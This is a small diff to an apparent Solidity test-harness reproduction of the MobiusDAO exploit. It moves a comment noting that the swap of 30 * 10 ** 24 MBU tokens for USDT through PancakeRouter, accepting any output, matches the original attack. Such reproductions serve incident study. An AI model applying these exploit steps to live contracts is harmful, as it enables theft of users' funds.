@@ -69,8 +69,7 @@ contract Exploit_MobiusDAO is TestHarness, TokenBalanceTracker{
         path[1] = address(usdt);
 
         pancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
-            //30000000000000000000000000, // Same as the amount in the original exploit
-            30 * 10 ** 24,
+            30 * 10 ** 24, // Same as the amount in the original exploit
             //mbu.balanceOf(address(this)), // If using all MBU, it fails with Pancake: OVERFLOW
             0, // Accept any amount of USDT
             path,
